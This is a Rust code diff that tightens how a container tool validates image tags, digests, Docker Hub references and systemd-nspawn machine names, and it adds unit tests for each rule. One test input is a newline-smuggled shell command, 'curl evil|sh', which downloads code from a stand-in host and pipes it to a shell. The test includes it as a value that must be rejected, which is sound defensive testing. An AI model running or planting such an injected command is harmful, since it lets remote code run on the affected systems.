@@ -46,11 +46,18 @@ impl ImageRef {
             bail!("repository name {repository:?} may only contain lowercase letters, digits, '.', '_', '-' and '/'");
         }
         if let Some(d) = &digest {
-            if !d.starts_with("sha256:")
-                || d.len() != 71
-                || !d[7..].chars().all(|c| c.is_ascii_hexdigit())
+            crate::store::validate_digest(d)?;
+        }
+        // The reference grammar's tag: what a registry takes in a URL, and nothing that
+        // ends a line of a script or a table.
+        if let Some(t) = &tag {
+            let mut chars = t.chars();
+            let first = chars.next();
+            if t.len() > 128
+                || !first.is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
+                || !chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
             {
-                bail!("digest {d:?} is not a sha256 digest");
+                bail!("tag {t:?} may only contain letters, digits, '_', '.' and '-' (128 at most), not starting with '.' or '-'");
             }
         }
         let tag = match (tag, &digest) {
@@ -67,17 +74,26 @@ impl ImageRef {
     }
 
     /// An image reference as Dockerfiles and compose files write them: one that names no
-    /// registry comes from Docker Hub, an official one under library/.
+    /// registry comes from Docker Hub, an official one under library/, and Docker Hub's
+    /// old name is Docker Hub, as the reference's splitDockerDomain has it.
     pub fn docker(image: &str) -> Result<Self> {
-        let first = image.split('/').next().unwrap_or("");
-        let has_registry = image.contains('/')
-            && (first.contains('.') || first.contains(':') || first == "localhost");
-        let full = if has_registry {
-            image.to_string()
-        } else if image.contains('/') {
-            format!("docker.io/{image}")
+        let (domain, rest) = match image.split_once('/') {
+            Some((first, rest))
+                if looks_like_registry(first) || first.chars().any(|c| c.is_ascii_uppercase()) =>
+            {
+                (first, rest)
+            }
+            _ => ("docker.io", image),
+        };
+        let domain = if domain == "index.docker.io" {
+            "docker.io"
         } else {
-            format!("docker.io/library/{image}")
+            domain
+        };
+        let full = if domain == "docker.io" && !rest.contains('/') {
+            format!("docker.io/library/{rest}")
+        } else {
+            format!("{domain}/{rest}")
         };
         ImageRef::parse(&full, "docker.io").with_context(|| format!("image {image}"))
     }
@@ -153,23 +169,30 @@ fn looks_like_registry(component: &str) -> bool {
     component == "localhost" || component.contains('.') || component.contains(':')
 }
 
-/// machined accepts names made of letters, digits, '.', '_' and '-', not starting with a dot.
+/// A machine name from any text: systemd-nspawn takes it as a host name, made of
+/// letters, digits and '-' in parts between dots, no part empty or starting or ending
+/// with '-', 64 bytes at most.
 pub fn sanitize_machine_name(name: &str) -> String {
-    let mut out: String = name
+    let mapped: String = name
         .chars()
         .map(|c| {
-            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
+            if c.is_ascii_alphanumeric() || c == '.' {
                 c
             } else {
                 '-'
             }
         })
         .collect();
-    while out.starts_with('.') {
-        out.remove(0);
-    }
+    let tidy = |text: &str| -> String {
+        text.split('.')
+            .map(|label| label.trim_matches('-'))
+            .filter(|label| !label.is_empty())
+            .collect::<Vec<_>>()
+            .join(".")
+    };
+    let mut out = tidy(&mapped);
     out.truncate(64);
-    out
+    tidy(&out)
 }
 
 /// A name that stays one entry of the directory it is joined to, which every machine or
@@ -187,15 +210,23 @@ pub fn validate_entry_name(name: &str) -> Result<()> {
     Ok(())
 }
 
+/// A name systemd-nspawn takes for --machine, a host name: letters, digits and '-' in
+/// parts between dots, no part empty or starting or ending with '-', 64 bytes at most.
 pub fn validate_machine_name(name: &str) -> Result<()> {
-    if name.is_empty() || name.len() > 64 || name.starts_with('.') {
+    if name.is_empty() || name.len() > 64 {
         bail!("invalid machine name {name:?}");
     }
     if !name
         .chars()
-        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
     {
-        bail!("machine name {name:?} may only contain letters, digits, '.', '_' and '-'");
+        bail!("machine name {name:?} may only contain letters, digits, '.' and '-'");
+    }
+    if name
+        .split('.')
+        .any(|label| label.is_empty() || label.starts_with('-') || label.ends_with('-'))
+    {
+        bail!("machine name {name:?} is no host name: a part between dots is empty, or starts or ends with '-'");
     }
     Ok(())
 }
@@ -205,6 +236,69 @@ mod tests {
     use super::*;
 
     const HUB: &str = "hub.nspawn.org";
+
+    #[test]
+    fn machine_names_are_host_names() {
+        for good in ["web", "web-1", "a.b", "nginx-1.27", "A--b"] {
+            assert!(validate_machine_name(good).is_ok(), "{good}");
+        }
+        for bad in [
+            "",
+            "my_app",
+            "-x",
+            "x-",
+            "a..b",
+            ".x",
+            "x.",
+            "a.-b",
+            &"x".repeat(65),
+        ] {
+            assert!(validate_machine_name(bad).is_err(), "{bad}");
+        }
+        assert_eq!(
+            sanitize_machine_name("google_containers-pause-3.2"),
+            "google-containers-pause-3.2"
+        );
+        assert_eq!(sanitize_machine_name("app-release_1"), "app-release-1");
+        let long = format!("{}.x", "a".repeat(63));
+        let cut = sanitize_machine_name(&long);
+        assert!(validate_machine_name(&cut).is_ok(), "{cut}");
+        assert!(validate_machine_name(
+            &ImageRef::parse("gcr.io/google_containers/pause:3.2", HUB)
+                .unwrap()
+                .local_name()
+        )
+        .is_ok());
+    }
+
+    #[test]
+    fn docker_hub_is_named_one_way() {
+        for (image, want) in [
+            ("alpine:3.22", "docker.io/library/alpine:3.22"),
+            ("docker.io/alpine:3.22", "docker.io/library/alpine:3.22"),
+            ("index.docker.io/alpine", "docker.io/library/alpine:latest"),
+            (
+                "index.docker.io/library/alpine",
+                "docker.io/library/alpine:latest",
+            ),
+            (
+                "docker.io/library/alpine",
+                "docker.io/library/alpine:latest",
+            ),
+            ("user/app:1", "docker.io/user/app:1"),
+            ("docker.io/user/app", "docker.io/user/app:latest"),
+            ("ghcr.io/o/app:2", "ghcr.io/o/app:2"),
+            ("localhost:5000/app", "localhost:5000/app:latest"),
+        ] {
+            assert_eq!(
+                ImageRef::docker(image).unwrap().to_string(),
+                want,
+                "{image}"
+            );
+        }
+        // An upper-case first part is a registry, and a host is no repository name.
+        assert!(ImageRef::docker("Foo/bar").is_err());
+    }
 
     #[test]
     fn short_name_gets_default_registry_and_tag() {
@@ -246,6 +340,32 @@ mod tests {
         assert_eq!(r.digest.as_deref(), Some(d.as_str()));
         assert_eq!(r.local_name(), "fedora-abababababab");
         assert!(ImageRef::parse("fedora@sha256:zz", HUB).is_err());
+        let upper = format!("fedora@sha256:{}", "AB".repeat(32));
+        assert!(ImageRef::parse(&upper, HUB).is_err());
+    }
+
+    #[test]
+    fn tags_follow_the_reference_grammar() {
+        for good in ["44", "1.36.1-musl", "_x", "Latest", &"a".repeat(128)] {
+            assert!(
+                ImageRef::parse(&format!("app:{good}"), HUB).is_ok(),
+                "{good}"
+            );
+        }
+        for bad in [
+            "",
+            ".x",
+            "-x",
+            "a b",
+            "1\ncurl evil|sh #",
+            "a;b",
+            &"a".repeat(129),
+        ] {
+            assert!(
+                ImageRef::parse(&format!("app:{bad}"), HUB).is_err(),
+                "{bad}"
+            );
+        }
     }
 
     #[test]
